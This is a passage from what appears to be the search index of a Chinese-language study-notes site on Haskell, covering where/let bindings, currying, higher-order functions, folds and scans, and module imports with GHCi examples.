\ndescribeList xs = \"The list is \" ++ case xs of [] -&gt; \"empty.\"  \n                                               [x] -&gt; \"a singleton list.\"   \n                                               xs -&gt; \"a longer list.\"  \n-- \u7b49\u4ef7\u4e8e\uff1a\ndescribeList :: [a] -&gt; String  \ndescribeList xs = \"The list is \" ++ what xs  \n    where what [] = \"empty.\"  \n          what [x] = \"a singleton list.\"  \n          what xs = \"a longer list.\" \n</code></pre></p>"},{"location":"cs/pl/haskell/#where","title":"where","text":"<p>\u58f0\u660e\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u8981\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 where \u5173\u952e\u5b57\uff1a <pre><code>initials :: String -&gt; String -&gt; String  \ninitials firstname lastname = [f] ++ \". \" ++ [l] ++ \".\"  \n    where (f:_) = firstname  \n          (l:_) = lastname  \n</code></pre> \u5728 where \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684\u6a21\u5f0f\u5339\u914d</p>"},{"location":"cs/pl/haskell/#let","title":"let","text":"<p><code>let &lt;bindings&gt; in &lt;expression&gt;</code> \u8bed\u6cd5\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u666e\u901a\u7b97\u5f0f\u6216\u5217\u8868\u4e2d\u4f7f\u7528\uff1a <pre><code>cylinder :: (RealFloat a) =&gt; a -&gt; a -&gt; a  \ncylinder r h = \n    let sideArea = 2 * pi * r * h  \n        topArea = pi * r ^2  \n    in  sideArea + 2 * topArea  \n</code></pre> <pre><code>ghci&gt; 4 * (let a = 9 in a + 1) + 2  \n42 \nghci&gt; [let square x = x * x in (square 5, square 3, square 2)]  \n[(25,9,4)] \n</code></pre></p>"},{"location":"cs/pl/haskell/#if-statement","title":"if statement","text":"<p>Haskell \u4e2d\u7684 if \u8bed\u53e5\u4e3a\uff1a <pre><code>if ... then ...\nelse ...\n-- or if ... then ... else ...\n-- or\nif ... then ...\nelse if ... then ...\nelse ...\n</code></pre> \u5176\u4e2d\u6700\u540e\u4e00\u4e2a else \u65e0\u8bba\u5982\u4f55\u4e5f\u4e0d\u53ef\u4ee5\u7701\u53bb</p>"},{"location":"cs/pl/haskell/#higher-order-functions","title":"Higher Order Functions","text":""},{"location":"cs/pl/haskell/#currying","title":"Currying","text":"<p>Haskell \u4e2d\u7684\u51fd\u6570\u662f\u67ef\u91cc\u5316\uff08Currying\uff09\u7684\uff0c\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u51fd\u6570\u90fd\u53ea\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u6bd4\u5982 max \u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a</p> <p>max :: Ord a =&gt; a -&gt; a -&gt; a</p> <p>\u53ef\u4ee5\u770b\u6210 a -&gt; (a -&gt; a)\uff0c\u5373\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a a -&gt; a \u7684\u51fd\u6570\u3002\u6bd4\u5982 max 1 \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a</p> <p>max 1 :: (Ord a, Num a) =&gt; a -&gt; a</p> <p>\u56e0\u6b64 max 1 2\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e (max 1) 2\uff0c\u5373\u5c06\u51fd\u6570 max 1 \u5e94\u7528\u5728\u6570\u5b572\u4e0a</p> <p>\u540c\u65f6\uff0c\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u53c2\u6570\u6709\u51fd\u6570\u7684\u51fd\u6570\u5c31\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570\uff08Higher Order Functions\uff09</p>"},{"location":"cs/pl/haskell/#_3","title":"\u4e00\u4e9b\u9ad8\u9636\u51fd\u6570","text":""},{"location":"cs/pl/haskell/#zipwith","title":"zipWith","text":"<p>zipWith :: (a -&gt; b -&gt; c) -&gt; [a] -&gt; [b] -&gt; [c]</p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u5c06\u5176\u5bf9\u5e94\u5143\u7d20\u4f20\u5165\u63a5\u6536\u7684\u51fd\u6570\u4e2d\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u7684\u5217\u8868\u3002\u5982\u679c\u4e24\u4e2a\u4f20\u5165\u7684\u5217\u8868\u957f\u5ea6\u4e0d\u540c\uff0c\u4ee5\u6700\u77ed\u7684\u5217\u8868\u4e3a\u51c6\uff0c\u957f\u5217\u8868\u4e2d\u8d85\u51fa\u7684\u5143\u7d20\u7701\u7565\u3002\u7528\u4f8b\uff1a <pre><code>ghci&gt; zipWith (+) [4,2,5,6] [2,6,2,3]  \n[6,8,7,9]  \nghci&gt; zipWith max [6,3,2,1] [7,3,1,5]  \n[7,3,2,5]  \n</code></pre></p>"},{"location":"cs/pl/haskell/#flip","title":"flip","text":"<p>flip :: (a -&gt; b -&gt; c) -&gt; b -&gt; a -&gt; c</p> <p>flip \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4e8c\u5143\u51fd\u6570\uff0c\u5c06\u5176\u8f93\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a <pre><code>ghci&gt; zip [1,2,3,4,5] \"hello\"\n[(1,'h'),(2,'e'),(3,'l'),(4,'l'),(5,'o')]\nghci&gt; flip zip [1,2,3,4,5] \"hello\"  \n[('h',1),('e',2),('l',3),('l',4),('o',5)]\n</code></pre></p>"},{"location":"cs/pl/haskell/#map","title":"map","text":"<p>map :: (a -&gt; b) -&gt; [a] -&gt; [b]</p> <p>map \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u5217\u8868 a \u7684\u6bcf\u4e2a\u5143\u7d20\u4e2d\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7ec4\u6210\u7684\u5217\u8868 b\uff1a <pre><code>ghci&gt; map (+3) [1,5,3,1,6]  \n[4,8,6,4,9]  \n</code></pre></p>"},{"location":"cs/pl/haskell/#filter","title":"filter","text":"<p>filter :: (a -&gt; Bool) -&gt; [a] -&gt; [a]</p> <p>filter \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f \u4e2d\uff0c\u5982\u679c\u7ed3\u679c\u4e3a True \u5c31\u4fdd\u7559\uff0c\u7ed3\u679c\u4e3a False \u5c31\u629b\u5f03\uff0c\u8fd4\u56de\u6240\u6709\u4fdd\u7559\u7684\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a <pre><code>ghci&gt; filter even [1..10]  \n[2,4,6,8,10] \n</code></pre></p>"},{"location":"cs/pl/haskell/#takewhile","title":"takeWhile","text":"<p>takeWhile :: (a -&gt; Bool) -&gt; [a] -&gt; [a]</p> <p>takeWhile \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u4ece\u5de6\u5411\u53f3\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f\uff0c\u76f4\u5230\u7ed3\u679c\u4e3a False \u505c\u6b62\uff0c\u8fd4\u56de\u505c\u6b62\u524d\u4f20\u5165\u7684\u6240\u6709\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a <pre><code>ghci&gt; takeWhile (/=' ') \"word1 word2\"\n\"word1\"\n</code></pre></p>"},{"location":"cs/pl/haskell/#function-application","title":"Function application","text":"<p>\u51fd\u6570\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528 <code>$</code>\uff0c<code>$</code> \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a</p> <p>($) :: (a -&gt; b) -&gt; a -&gt; b</p> <p>\u5b83\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7ed3\u5408\u4f18\u5148\u7ea7\uff0c\u5c06\u5de6\u4fa7\u51fd\u6570\u5e94\u7528\u4e8e\u5168\u90e8\u53f3\u4fa7\u5185\u5bb9\u4e0a\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53f3\u4fa7\u6574\u4f53\u52a0\u4e0a\u4e86\u62ec\u53f7\u3002\u5426\u5219\u51fd\u6570\u9ed8\u8ba4\u5de6\u7ed3\u5408\uff0c\u4f1a\u4f9d\u6b21\u5411\u53f3\u5e94\u7528\u800c\u4e0d\u4f1a\u5e94\u7528\u5728\u6574\u4f53\u4e0a\u3002 <pre><code>f $ g x\n-- \u7b49\u4ef7\u4e8e\nf (g x)\n-----\nf g x\n-- \u7b49\u4ef7\u4e8e\n(f g) x\n</code></pre></p>"},{"location":"cs/pl/haskell/#function-composition","title":"Function Composition","text":"<p>\u51fd\u6570\u590d\u5408\u53ef\u4ee5\u4f7f\u7528 <code>.</code>\uff0c<code>.</code> \u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a</p> <p>(.) :: (b -&gt; c) -&gt; (a -&gt; b) -&gt; a -&gt; c</p> <p>\u5b9a\u4e49\u662f\uff1a</p> <p>f . g = \\x -&gt; f (g x)</p> <p>\u4f46\u662f\u51fd\u6570\u590d\u5408\u7684\u4f18\u5148\u7ea7\u8981\u6bd4\u51fd\u6570\u6267\u884c\u4f4e\uff0c\u6bd4\u5982\uff1a <pre><code>sum . replicate 5 . max 6.7 8.9\n</code></pre> \u4f1a\u5148\u6267\u884c max 6.7 8.9 \u5e76\u8fd4\u56de 8.9\uff0c\u7136\u540e\u5c06 sum\u3001replicate 5\u30018.9 \u590d\u5408\uff0c\u4f46\u4e24\u4e2a\u51fd\u6570\u65e0\u6cd5\u548c\u4e00\u4e2a\u503c (8.9) \u590d\u5408\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u56e0\u6b64\u8981\u4f7f\u7528 <code>$</code>\u6765\u89c4\u5b9a\u5148\u590d\u5408\u518d\u6267\u884c\uff1a <pre><code>sum . replicate 5 . max 6.7 $ 8.9\n</code></pre></p>"},{"location":"cs/pl/haskell/#lambda","title":"lambda","text":"<p>Haskell \u8bed\u8a00\u4e2d\u7684 lambda \u8868\u8fbe\u5f0f\u662f\u7528 <code>\\</code> \u6765\u8868\u793a\u7684\uff08\u56e0\u4e3a\u770b\u7740\u50cf\\(\\mathtt{\\lambda}\\)\uff1f\uff09 \u5177\u4f53\u8bed\u6cd5\u662f <pre><code>\\para1 para2 ... -&gt; return\n</code></pre> \"-&gt;\" \u524d\u7684 para1 para2 ... \u662f\u4f20\u5165\u53c2\u6570\uff0c\u5355\u4e2a\u591a\u4e2a\u90fd\u53ef\u4ee5\uff0c\u9700\u8981\u7528\u7a7a\u683c\u9694\u5f00\uff1b\"-&gt;\" \u540e\u7684 return \u662f\u8ba1\u7b97\u5f97\u5230\u7684\u8fd4\u56de\u503c\u3002\u4e00\u822c\u9700\u8981\u7528\u62ec\u53f7\u5c06\u6574\u4e2a\u8868\u8fbe\u5f0f\u62ec\u8d77\u6765\uff0c\u9632\u6b62\u8fd4\u56de\u503c\u90e8\u5206\u4e00\u76f4\u5411\u53f3\u5ef6\u4f38\u3002</p>"},{"location":"cs/pl/haskell/#foldscan","title":"fold\u548cscan","text":"<p>fold \u548c scan \u90fd\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u4e00\u4e2a\u521d\u59cb\u503c accumulator\uff0c\u4e00\u4e2a\u8981\u6298\u53e0\u7684\u5217\u8868\uff09\uff0cfold \u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u800c scan \u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u4f20\u5165\u7684\u4e8c\u5143\u51fd\u6570 <code>f :: a -&gt; b -&gt; b</code> \u5c06 accumulator \u548c\u4ece\u5217\u8868\u4e2d\u53d6\u51fa\u7684\u503c\u4e00\u540c\u4f20\u5165\uff08l \u5219 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0cr \u5219 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09</p>"},{"location":"cs/pl/haskell/#foldl","title":"foldl","text":"<p>\u5de6\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u5de6\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\uff1a <pre><code>foldl f a xs\n</code></pre> \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a <pre><code>&gt; foldl f a [x1, x2, x3]\n[1.] a = f a x1\n[2.] a = f a x2 = f (f a x1) x2\n[3.] a = f a x3 = f (f (f a x1) x2) x3\n</code></pre> \u53ef\u4ee5\u770b\u51fa f (f a x1) x2 \u5176\u5b9e\u5c31\u662f foldl f a [x1, x2] \u800c\u4e14\u56e0\u6b64\uff0cfoldl \u5728\u8ba1\u7b97\u65f6\u6700\u5916\u5c42\u9700\u8981\u627e\u5230 x3\uff0c\u8fd9\u6837\u5982\u679c xs \u662f\u4e00\u4e2a\u65e0\u7a77\u5217\u8868\uff0c\u90a3\u4e48\u5c06\u65e0\u6cd5\u8ba1\u7b97\uff0c\u9677\u5165\u65e0\u7a77\u3002\u6240\u4ee5 foldl \u867d\u7136\u770b\u8d77\u6765\u4ece\u5de6\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u51fd\u6570\u9700\u8981\u4ece\u53f3\u4fa7\u5c55\u5f00\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u65e0\u7a77\u5217\u8868</p>"},{"location":"cs/pl/haskell/#foldr","title":"foldr","text":"<p>\u53f3\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u53f3\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5982\uff1a <pre><code>foldr f a xs\n</code></pre> \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a <pre><code>&gt; foldr f a [x1, x2, x3]\n[1.] a = f x3 a\n[2.] a = f x2 a = f x2 (f x3 a)\n[3.] a = f x1 a = f x1 (f x2 (f x3 a))\n</code></pre> \u4ece\u4e2d\u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u5c31\u662f foldr f a [x2, x3] \u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c foldr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570: <pre><code>foldr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; b\nfoldr' _ x [] = x\nfoldr' f a (x:xs) = f x (foldr' f a xs)\n</code></pre> \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6700\u5916\u5c42\u8ba1\u7b97\u65f6\u53ea\u9700\u8981 x1 \u5e76\u4e14\u5411\u4e0b\u9012\u5f52\uff0c\u5e76\u4e0d\u4f1a\u63a5\u89e6\u5230\u5217\u8868\u672b\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002foldr \u5373\u4f7f\u770b\u4e0a\u53bb\u4ece\u53f3\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u8981\u4ece\u5de6\u5f00\u59cb\u5c55\u5f00\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868</p> <p>\u4f8b\u5982\uff1a <pre><code>ghci&gt; foldr (||) False (repeat True)\nTrue    -- \u7531\u4e8e\u903b\u8f91\u8fd0\u7b97\u5b58\u5728\u77ed\u8def\uff0c\u8ba1\u7b97\u503c\u5168\u5e94\u4e3aTrue\uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de\u4e86\nghci&gt; foldl (||) False (repeat True)\n-- \u8fd9\u91cc\u4ec0\u4e48\u90fd\u4e0d\u4f1a\u53d1\u751f\uff0c\u76f4\u5230\u7535\u8111\u5185\u5b58\u88ab\u7206\u6389\n-- \u56e0\u4e3a\u51fd\u6570\u521a\u5f00\u59cb\u5c31\u9700\u8981\u5217\u8868\u6700\u53f3\u4fa7\u7684\u503c\uff0c\u6240\u4ee5\u5728\u4e0d\u65ad\u8ba1\u7b97\u8fd9\u4e2a\u65e0\u7a77\u5217\u8868\n</code></pre></p>"},{"location":"cs/pl/haskell/#scanl-scanr","title":"scanl \u548c scanr","text":"<p>scan \u7c7b\u4f3c fold\uff0c\u53ea\u662f\u5c06\u4e2d\u95f4\u5f97\u5230\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6dfb\u52a0\u8fdb\u4e00\u4e2a\u5217\u8868\u4e2d\u5e76\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 scanl \u5219\u5411\u53f3\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868\uff0cscanr \u5219\u5411\u5de6\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868 \u4f46\u662f\u5b83\u548c fold \u6070\u6070\u76f8\u53cd\uff0cscanl \u80fd\u7528\u4e8e\u65e0\u7a77\u5217\u8868\uff0c\u800c scanr \u4e0d\u80fd <pre><code>&gt; scanr f a [x1, x2, x3]\n[1.] \u6700\u53f3\u4fa7\u5143\u7d20(-1 in python) : a\n[2.] \u53f3\u4fa7\u7b2c\u4e8c\u4e2a\u5143\u7d20(-2) : f x3 a\n[3.] \u53f3\u4fa7\u7b2c\u4e09\u4e2a\u5143\u7d20(-3) : f x2 (f x3 a)\n[4.] \u53f3\u4fa7\u7b2c\u56db\u4e2a\u5143\u7d20(-4) : f x1 (f x2 (f x3 a))\n</code></pre> \u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u662f foldr f a [x2, x3]\uff0c\u4e5f\u662f scanr f a [x2, x3] \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 \u56e0\u6b64\u53ef\u4ee5\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c scanr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570\uff1a <pre><code>scanr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; [b]\nscanr' _ x [] = [x]\n-- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs\nscanr' f a (x:xs) = f x q : qs\n                    where qs@(q:_) = scanr' f a xs\n</code></pre> scanl \u4e5f\u662f\u540c\u7406\uff1a <pre><code>scanl' :: (b -&gt; a -&gt; b) -&gt; b -&gt; [a] -&gt; [b]\nscanl' _ x [] = [x]\nscanl' f a (x:xs) = a : scanl' f (f a x) xs\n</code></pre></p> <p>\u4e5f\u53ef\u4ee5\u770b\u51fa\uff0cscanr \u8fd4\u56de\u7684\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u6700\u540e\u6dfb\u52a0\u8fdb\u53bb\u7684\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002\u800c scanl \u8fd4\u56de\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u662f\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u6dfb\u52a0\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u622a\u53d6\u524d\u4e00\u90e8\u5206\u7ed3\u679c\uff1a <pre><code>ghci&gt; take 10 (scanl (+) 0 [1..])\n[0,1,3,6,10,15,21,28,36,45]\nghci&gt; take 10 (scanr (+) 0 [1..])\n[*** Exception: stack overflow\n</code></pre></p>"},{"location":"cs/pl/haskell/#foldr-foldl","title":"\u4f7f\u7528 foldr \u7f16\u5199 foldl","text":"<p>pdcxs \u8fd8\u7ed9\u6211\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u795e\u5947\u7684\u64cd\u4f5c\uff0c\u7528 foldl \u6765\u5b9a\u4e49 foldr\uff1a <pre><code>foldl' f z xs = foldr (\\x g y -&gt; g (f y x)) id xs z\n</code></pre></p> <p>\u5b83\u5229\u7528 foldr (\\x g y -&gt; g (f y x)) id xs \u751f\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u4f5c\u7528\u4e8ez\u5f97\u5230\u7ed3\u679c\u3002</p> <p>\u5148\u6765\u770b\u4e00\u4e0b foldr \u7684\u7c7b\u578b\uff1a <pre><code>foldr :: Foldable t =&gt; (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b\n-- \u53ef\u4ee5\u770b\u6210 (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; b\n</code></pre> \u4f46\u662f\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7c7b\u578b b \u5e76\u4e0d\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u800c\u662f\u4e00\u4e2a\u51fd\u6570 (b -&gt; b)\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc foldr \u7684\u7c7b\u578b\u53ef\u4ee5\u5199\u6210\uff1a</p> <p>(a -&gt; (b -&gt; b) -&gt; (b -&gt; b)) -&gt; (b -&gt; b) -&gt; [a] -&gt; (b -&gt; b)</p> <p>\u5bf9\u5e94\u4e8e\u7528\u6cd5 foldr (\\x g y -&gt; g (f y x)) id xs \uff0c\u5b83\u8fd4\u56de\u7684\u503c\u5e94\u8be5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a b -&gt; b\uff08\u540e\u9762\u8981\u4f5c\u7528\u4e8ez\uff09 \u800c xs \u5bf9\u5e94\u4e8e [a]\uff1bid \u5bf9\u5e94\u4e8e (b -&gt; b) \u6240\u4ee5 (\\x g y -&gt; g (f y x)) \u8981\u5bf9\u5e94\u4e8e\uff1a</p> <p>(a -&gt; (b -&gt; b) -&gt; (b -&gt; b))</p> <p>\u56e0\u6b64\u53ef\u4ee5\u63a8\u65ad\u51fa x \u7684\u7c7b\u578b\u662f a\uff1by \u7684\u7c7b\u578b\u662f b\uff1b\u800c\u8fd4\u56de\u7684\u503c\u4e3a\u4e00\u4e2a\u7c7b\u578b\u4e3a (b -&gt; b) \u7684\u51fd\u6570\u3002</p> <p>\u518d\u770b\uff0c\u8fd4\u56de\u7684\u503c\u662f g (f y x) \uff0c\u5176\u4e2d f y x \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u503c\uff0c\u7c7b\u578b\u4e3a b \u6240\u4ee5 g \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b b\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b b -&gt; b\u3002\u5373 g \u7684\u7c7b\u578b\u4e3a\uff1a</p> <p>b -&gt; (b -&gt; b)</p> <p>\u73b0\u5728\u6839\u636e foldr \u7684\u5b9a\u4e49\uff1a</p> <p>foldr f a (x:xs) = f x (foldr f a xs)</p> <p>\u5e26\u5165\u8ba1\u7b97\u4e00\u4e0b\uff1a</p> <p>xs \u5373\u4e3a [x1..xn]\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u7528 xs' \u6765\u8868\u793a [x2..xn]\uff0c\u7528 xs'' \u6765\u8868\u793a [x3..xn]</p> <p>\u5b9a\u4e49\u4e2d\u7684 f \u5373\u4e3a (\\x g y -&gt; g (f y x))\uff0ca \u5373\u4e3a id</p> <p><pre><code>  foldr (\\x g y -&gt; g (f y x)) id xs z\n= (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z\n</code></pre> \u5199\u5b8c\u7b2c\u4e00\u6b65\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0cx1 (foldr (...) id xs') z \u6b63\u597d\u5206\u522b\u5bf9\u5e94\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684 x\u3001g\u3001y\u3002\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\uff0c\u8fdb\u4e00\u6b65\u5c55\u5f00\uff1a <pre><code>  (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z\n= (foldr (...) id xs') (f z x1)\n</code></pre> \u4e0d\u96be\u53d1\u73b0\uff0c\u539f\u5f0f (foldr (...) id xs) z \u7b49\u4ef7\u4e8e\uff1a</p> <p>(foldr (...) id xs') (f z x1)</p> <p>\u8ddf\u7740\u8fd9\u4e2a\u601d\u8def\uff0cxs \u6bcf\u6b21\u5c11\u4e00\u4e2a\u5f00\u5934\u7684\u5143\u7d20 x'\uff0cz \u6bcf\u6b21\u53d8\u6362\u6210\u4e3a f z x' \u56e0\u6b64\u4e0b\u4e00\u6b65\uff1a <pre><code>  (\\x g y -&gt; g (f y x)) x1 (foldr (...) id xs') z\n= (foldr (...) id xs') (f z x1)\n= (foldr (...) id xs'') (f (f z x1) x2)\n= (foldr (...) id xs''') (f (f (f z x1) x2) x3)\n= ...\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\uff0c\u5df2\u7ecf\u6709\u4e86\u89c4\u5f8b\u3002\u90a3\u4e48\u6700\u7ec8\u505c\u6b62\u65f6\u662f\u4ec0\u4e48\u6837\u5462\uff1f</p> <p>\u6700\u540e\u5230\u4e86\u4e0d\u80fd\u5728\u5c55\u5f00\u65f6\uff0c\u6700\u524d\u9762\u7684 foldr (...) id xs \u5df2\u7ecf\u53d8\u6210\u4e86 foldr (...) id [] \u800c\u6839\u636e\u524d\u9762 foldr \u7684\u5b9a\u4e49 foldr _ x [] = x \uff0c\u5b83\u5e94\u8be5\u8fd4\u56de id</p> <p>\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\uff1a (id \u7684\u5b9a\u4e49\uff1aid x = x) <pre><code>  ...\n= (foldr (...) id xs') (f z x1)\n= (foldr (...) id xs'') (f (f z x1) x2)\n= ...\n= (foldr (...) id []) (f (.. (f z x1) ..) xn)\n= id (f (.. (f z x1) ..) xn)\n= f (.. (f z x1) ..) xn\n</code></pre> \u90a3\u4e48\u6700\u540e\u8fd9\u4e2a\u7ed3\u679c\u5c31\u5f88\u719f\u6089\u4e86\uff0c\u5b83\u5c31\u662f foldl f z xs\u3002 \u6240\u4ee5\u6211\u4eec\u63a8\u5bfc\u51fa\u4e86\u8fd9\u4e2a\u7528 foldr \u8868\u793a foldl \u7684\u5199\u6cd5\u662f\u6b63\u786e\u7684\u3002</p>"},{"location":"cs/pl/haskell/#modules","title":"Modules","text":"<p>Haskell \u4f1a\u81ea\u52a8\u52a0\u8f7d Prelude \u6a21\u5757\uff08module\uff09\uff0c\u5982\u679c\u5728 GHCi \u4e2d\u518d\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 <code>:m + ...</code>\uff0c\u6bd4\u5982\u52a0\u8f7d Data.List \u6a21\u5757\uff1a</p> <p>Prelude&gt; :m + Data.List</p> <p>\u800c\u5728 hs \u6587\u4ef6\u4e2d\u5f15\u5165\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 <code>import</code> \u8bed\u53e5\uff0c\u4e0b\u9762\u548c python \u7684\u5bf9\u6bd4\u53ef\u4ee5\u4fbf\u4e8e\u7406\u89e3\uff1a <pre><code>import Data.List\n-- from Data.List import *\n\nimport Data.List (nub, sort)\n-- from Data.List import nub, sort\n\nimport Data.List hiding (nub)\n-- \u4eceData.List\u4e2d\u5f15\u5165\u6240\u6709\uff0c\u4f46\u4e0d\u5f15\u5165nub\u51fd\u6570\n\nimport qualified Data.List\n-- import Data.List\n\nimport qualified Data.List as Li\n-- import Data.List as Li\n</code></pre></p>"},{"location":"cs/pl/haskell/#modules_1","title":"\u7f16\u5199 